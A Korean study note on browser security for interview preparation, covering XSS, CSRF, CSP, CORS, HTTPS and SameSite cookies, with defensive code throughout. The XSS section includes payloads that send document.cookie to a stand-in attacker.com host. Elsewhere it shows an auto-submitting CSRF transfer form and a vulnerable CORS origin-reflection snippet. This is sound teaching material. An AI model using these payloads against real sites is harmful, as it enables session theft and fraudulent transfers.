# 8. 브라우저 보안 (XSS, CSRF, CSP, CORS, HTTPS, SameSite)

## 목차
1. XSS (Cross-Site Scripting)
2. CSRF (Cross-Site Request Forgery)
3. CSP (Content Security Policy)
4. CORS 보안 관점
5. HTTPS와 인증서
6. SameSite 쿠키
7. 면접 포인트

---

## 1. XSS (Cross-Site Scripting)

### 개념
공격자가 악의적인 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격. 세션 탈취, 피싱, 키로깅, 크립토마이닝 등에 악용됩니다.

### 공격 유형

#### 1) 저장형 XSS (Stored XSS)
- 악성 스크립트가 데이터베이스에 저장되어 다른 사용자에게 지속적으로 전달
- 게시판 댓글, 사용자 프로필에 스크립트 삽입

```html
<!-- 공격자가 댓글로 입력한 내용 -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- 또는 이미지 태그를 이용한 우회 -->
<img src="x" onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

#### 2) 반사형 XSS (Reflected XSS)
- URL 파라미터의 악성 스크립트가 서버 응답에 즉시 반영
- 피해자가 악성 링크를 클릭했을 때 발생

```
# 악성 URL
https://example.com/search?q=<script>alert(document.cookie)</script>

# 취약한 서버 응답
<p>검색 결과: <script>alert(document.cookie)</script></p>
```

#### 3) DOM 기반 XSS (DOM-based XSS)
- 서버를 거치지 않고 클라이언트 JavaScript가 DOM을 직접 조작할 때 발생

```javascript
// 취약한 코드
const query = location.hash.slice(1);
document.getElementById('result').innerHTML = query;  // 위험!

// https://example.com#<img src=x onerror=alert(1)> 접속 시 XSS 발생
```

### 방어 방법

#### 1) 출력 이스케이프 (Output Encoding)

```javascript
// HTML 엔티티 이스케이프 유틸리티
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return String(str).replace(/[&<>"'/]/g, (char) => map[char]);
}

// 안전한 DOM 조작
const userInput = '<script>alert(1)</script>';

// 위험
element.innerHTML = userInput;

// 안전 - textContent는 HTML로 파싱하지 않음
element.textContent = userInput;

// 안전 - createTextNode 활용
const textNode = document.createTextNode(userInput);
element.appendChild(textNode);

// 안전 - 이스케이프 후 innerHTML
element.innerHTML = escapeHtml(userInput);

// 안전 - DOMPurify 라이브러리 (리치 텍스트 허용 시)
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

#### 2) CSP 헤더 설정 (별도 섹션에서 상세 설명)

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'
```

#### 3) 쿠키 보호

```http
Set-Cookie: sessionId=abc; HttpOnly; Secure; SameSite=Strict
```

#### 4) React/Vue에서의 XSS

```jsx
// React는 기본적으로 XSS 방어 (JSX가 자동 이스케이프)
const userInput = '<script>alert(1)</script>';
return <div>{userInput}</div>;  // 안전: 텍스트로 렌더링됨

// 위험: dangerouslySetInnerHTML 사용 시 주의
return (
  <div
    dangerouslySetInnerHTML={{
      __html: DOMPurify.sanitize(richTextContent),  // 반드시 sanitize
    }}
  />
);
```

---

## 2. CSRF (Cross-Site Request Forgery)

### 개념
인증된 사용자의 브라우저를 통해 공격자가 의도하지 않은 요청을 전송하는 공격. 쿠키 기반 인증에서 발생하며, 브라우저가 자동으로 쿠키를 포함하는 특성을 악용합니다.

### 공격 시나리오

```html
<!-- 공격자 사이트 (https://attacker.com/evil.html) -->
<!-- 피해자가 bank.com에 로그인된 상태에서 이 페이지를 열면 -->
<!-- 브라우저가 bank.com의 쿠키를 자동으로 포함하여 요청을 보냄 -->

<!-- 방법 1: 이미지 태그를 이용한 GET 요청 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000000" width="0" height="0">

<!-- 방법 2: 자동 제출 폼을 이용한 POST 요청 -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
```

### 방어 방법

#### 1) CSRF 토큰

```javascript
// --- 서버 측 (Node.js Express + csurf 미들웨어) ---
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// 토큰 발급 (폼 렌더링 시)
app.get('/transfer', csrfProtection, (req, res) => {
  res.render('transfer', { csrfToken: req.csrfToken() });
});

// 토큰 검증 (폼 제출 시)
app.post('/transfer', csrfProtection, (req, res) => {
  // csrfProtection 미들웨어가 자동으로 토큰 검증
  // 검증 실패 시 403 에러 반환
  processTransfer(req.body);
});

// --- 클라이언트 측 ---
// HTML 폼에 hidden 필드로 포함
// <input type="hidden" name="_csrf" value="{{ csrfToken }}">

// AJAX 요청 시 헤더에 포함
async function transferFunds(data) {
  const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

  await fetch('/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    },
    body: JSON.stringify(data),
  });
}

// Double Submit Cookie 패턴
// 서버: 랜덤 값을 쿠키와 응답에 동시에 전달
// 클라이언트: 요청 헤더에 쿠키값과 동일한 값 포함
// 서버: 쿠키값 == 헤더값 검증
```

#### 2) SameSite 쿠키 (가장 현대적인 방어)

```http
# Strict: 크로스 사이트 요청에는 절대 쿠키 전송 안 함
Set-Cookie: sessionId=abc; SameSite=Strict

# Lax: 안전한 메서드(GET)의 탑레벨 네비게이션만 허용
Set-Cookie: sessionId=abc; SameSite=Lax
```

#### 3) Referer / Origin 헤더 검증

```javascript
// 서버 측 Origin 헤더 검증
app.use((req, res, next) => {
  if (req.method !== 'GET') {
    const origin = req.headers.origin;
    const allowedOrigins = ['https://myapp.com'];

    if (!allowedOrigins.includes(origin)) {
      return res.status(403).json({ error: 'CSRF 공격 감지' });
    }
  }
  next();
});
```

---

## 3. CSP (Content Security Policy)

### 개념
HTTP 응답 헤더 또는 meta 태그로 설정하는 보안 정책. 브라우저가 로드할 수 있는 리소스의 출처를 제한하여 XSS 공격을 완화합니다.

### 주요 지시어

| 지시어 | 설명 |
|--------|------|
| `default-src` | 기타 지시어의 기본값 |
| `script-src` | JavaScript 출처 |
| `style-src` | CSS 출처 |
| `img-src` | 이미지 출처 |
| `connect-src` | fetch, XHR, WebSocket 출처 |
| `font-src` | 웹 폰트 출처 |
| `frame-src` | iframe 출처 |
| `media-src` | 오디오/비디오 출처 |
| `object-src` | Flash 등 플러그인 (none 권장) |
| `base-uri` | base 태그의 URL 제한 |
| `form-action` | 폼 제출 대상 URL |
| `upgrade-insecure-requests` | HTTP → HTTPS 자동 업그레이드 |

### CSP 헤더 설정 예제

```http
# 기본 보안 정책
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  img-src 'self' data: https://images.example.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com wss://ws.example.com;
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
  report-uri /csp-violation-report;
```

```javascript
// --- Nonce 기반 인라인 스크립트 허용 ---
// 서버에서 요청마다 랜덤 nonce 생성
const crypto = require('crypto');

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');

  res.setHeader(
    'Content-Security-Policy',
    `default-src 'self'; script-src 'self' 'nonce-${res.locals.cspNonce}'`
  );
  next();
});

// HTML 템플릿에서 nonce 사용
// <script nonce="{{ cspNonce }}">
//   // 이 인라인 스크립트만 허용됨
//   initApp();
// </script>

// --- CSP 위반 보고 ---
// Content-Security-Policy-Report-Only: 위반 감지만 하고 차단하지 않음 (테스트용)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy-Report-Only',
    "default-src 'self'; report-uri /csp-report"
  );
  next();
});

// 위반 보고 수신
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP 위반:', req.body['csp-report']);
  res.status(204).end();
});

// --- HTML meta 태그로 설정 (report-uri 미지원) ---
// <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

---

## 4. CORS 보안 관점

### 동일 출처 정책(SOP)의 보안 역할
- 브라우저가 악성 사이트에서 은행 API를 호출하는 것을 기본 차단
- CORS는 서버가 명시적으로 허용한 출처만 교차 출처 요청 가능하게 함

### 보안 관련 CORS 설정 주의사항

```javascript
// 위험: 와일드카드 + 자격증명 조합 (불가능하지만 시도되는 잘못된 설정)
// Access-Control-Allow-Origin: *
// Access-Control-Allow-Credentials: true
// → 브라우저가 이 조합을 차단함 (CORS 스펙에서 금지)

// 위험: 동적 Origin 허용 시 검증 누락
app.use((req, res, next) => {
  // 취약: 모든 Origin을 반사 (Reflection Attack)
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);  // 위험!
  next();
});

// 안전: 허용 목록(allowlist) 기반 검증
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com',
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Vary', 'Origin');  // 캐시 구분을 위해 필수
  }
  next();
});

// 서브도메인 허용 시 정규식 검증
function isAllowedOrigin(origin) {
  return /^https:\/\/[\w-]+\.example\.com$/.test(origin);
}
```

### CORS와 사전 인증 요청(Credentialed Request)
```javascript
// 클라이언트
fetch('https://api.example.com/user', {
  credentials: 'include',  // 쿠키 포함
});

// 서버: credentials 요청에는 반드시 구체적인 Origin 지정
// Access-Control-Allow-Origin: https://app.example.com  (not *)
// Access-Control-Allow-Credentials: true
```

---

## 5. HTTPS와 인증서

### TLS 인증서 구성

```
인증서 체인 (Certificate Chain)
├── Root CA (최상위 인증 기관, 브라우저/OS에 내장)
│   └── Intermediate CA (중간 인증 기관)
│       └── End-Entity Certificate (서버 인증서)
│           ├── Subject: example.com
│           ├── Public Key
│           ├── Validity: 2025-01-01 ~ 2026-01-01
│           └── Signature (Intermediate CA의 서명)
```

### 인증서 관련 공격과 방어

```http
# HSTS (HTTP Strict Transport Security)
# 브라우저에게 지정 기간 동안 반드시 HTTPS만 사용하도록 강제
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Certificate Transparency (CT)
# 모든 인증서 발급을 공개 로그에 기록, 가짜 인증서 탐지
# 브라우저는 CT 로그에 없는 인증서를 거부
Expect-CT: max-age=86400, enforce, report-uri="https://example.com/ct-report"

# HPKP (HTTP Public Key Pinning) - 폐기됨
# 특정 공개키만 허용 (잘못 설정 시 사이트 접근 불가 위험)
```

### Let's Encrypt를 이용한 무료 인증서

```bash
# Certbot으로 Let's Encrypt 인증서 발급
certbot --nginx -d example.com -d www.example.com

# 자동 갱신 (90일마다 만료, cron 등록)
certbot renew --quiet
```

---

## 6. SameSite 쿠키

### SameSite 속성 비교

| 값 | 설명 | 크로스 사이트 GET | 크로스 사이트 POST |
|----|------|:-----------------:|:-----------------:|
| `Strict` | 완전 차단 | X | X |
| `Lax` | 탑레벨 GET만 허용 | O (링크 클릭) | X |
| `None` | 모두 허용 | O | O |

> `SameSite=None`은 반드시 `Secure` 속성과 함께 사용해야 함

### 상세 비교

```
SameSite=Strict
  - https://other.com의 링크 클릭으로 example.com 방문 → 쿠키 전송 X
  - 탭에서 직접 example.com 입력 → 쿠키 전송 O
  - 가장 강력한 CSRF 방어, 단 외부 링크 유입 시 로그아웃 상태로 보임

SameSite=Lax (Chrome 기본값)
  - 외부 링크 클릭으로 이동하는 GET 요청 → 쿠키 전송 O
  - <img>, <iframe>, fetch, XMLHttpRequest (크로스 사이트) → 쿠키 전송 X
  - 폼 POST (크로스 사이트) → 쿠키 전송 X
  - 실용적인 CSRF 방어와 UX의 균형

SameSite=None; Secure
  - 모든 크로스 사이트 요청에 쿠키 포함
  - 서드파티 인증(OAuth), 임베드 위젯, 결제 연동 시 필요
  - HTTPS 필수
```

### 코드 예제

```javascript
// 서버 측 쿠키 설정
const cookieOptions = {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',      // 'strict' | 'lax' | 'none'
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7일
};

// 세션 쿠키 (로그인 유지)
res.cookie('sessionId', sessionToken, {
  ...cookieOptions,
  sameSite: 'strict',  // CSRF 최대 방어
});

// 서드파티 임베드용 쿠키
res.cookie('embedToken', embedToken, {
  ...cookieOptions,
  sameSite: 'none',
  secure: true,  // SameSite=None은 반드시 Secure 필요
});

// --- 브라우저 호환성 처리 ---
// 구형 브라우저는 SameSite=None을 인식 못하고 Strict으로 처리
// User-Agent 기반 분기 처리 (선택적)
function getSameSiteOption(userAgent) {
  // iOS 12, macOS 10.14 Chrome 51-66, UC Browser 등에서 SameSite=None 버그
  const isIncompatibleBrowser = /iP.+; CPU .*OS 12[_\d]*.*Safari/i.test(userAgent);
  return isIncompatibleBrowser ? 'unset' : 'none';
}
```

---

## 7. 면접 포인트

### Q1. XSS와 CSRF의 차이점은?
XSS는 공격자의 스크립트가 피해자의 브라우저에서 실행되어 데이터를 탈취합니다. CSRF는 인증된 피해자의 브라우저를 통해 공격자가 의도한 요청을 서버에 보냅니다. XSS는 입력값 검증/이스케이프와 CSP로, CSRF는 CSRF 토큰과 SameSite 쿠키로 방어합니다.

### Q2. CSP(Content Security Policy)를 설명해주세요.
CSP는 HTTP 헤더로 설정하여 브라우저가 로드할 수 있는 리소스 출처를 제한하는 보안 정책입니다. `script-src 'self'`로 외부 스크립트를 차단하거나, nonce/hash 기반으로 특정 인라인 스크립트만 허용할 수 있습니다. XSS 공격의 스크립트 실행을 근본적으로 차단할 수 있습니다. `Report-Only` 모드로 실제 차단 없이 위반 사항을 먼저 수집할 수 있습니다.

### Q3. SameSite=Lax와 Strict의 차이는?
Strict는 모든 크로스 사이트 요청에서 쿠키를 차단합니다. 외부 링크로 사이트에 들어오면 로그아웃 상태로 보여 UX가 나쁠 수 있습니다. Lax는 외부 링크 클릭 등 탑레벨 GET 네비게이션은 쿠키를 허용합니다. 일반 서비스에는 Lax, 금융/관리자 페이지처럼 보안이 중요한 곳에는 Strict를 사용합니다.

### Q4. HTTPS만 사용하면 XSS를 방어할 수 있나요?
아닙니다. HTTPS는 네트워크 전송 구간의 도청과 변조를 방지하지만, XSS는 브라우저 내에서 실행되는 공격이므로 HTTPS와 무관합니다. XSS는 입력값 검증, 출력 이스케이프, CSP, HttpOnly 쿠키 등으로 방어해야 합니다.

### Q5. CORS 설정 시 보안적으로 주의할 점은?
`Access-Control-Allow-Origin: *` 과 `Access-Control-Allow-Credentials: true` 조합은 브라우저가 차단합니다. 동적으로 Origin을 허용할 때는 화이트리스트를 반드시 검증해야 하며, 요청 Origin을 그대로 반사하면 CORS 인증 우회가 가능합니다. `Vary: Origin` 헤더를 함께 설정해 캐시가 Origin을 구분하게 해야 합니다.

### Q6. 인증 토큰 저장 방식별 보안 비교를 해주세요.
localStorage는 XSS에 취약(JS로 읽기 가능)하지만 CSRF에는 안전합니다. 쿠키(`HttpOnly`)는 XSS에서 JS 접근이 불가능하지만 CSRF에 취약합니다. 따라서 `HttpOnly + Secure + SameSite=Strict` 쿠키와 CSRF 토큰을 함께 사용하거나, Access Token은 메모리 변수에 두고 Refresh Token을 HttpOnly 쿠키에 저장하는 방식이 권장됩니다.
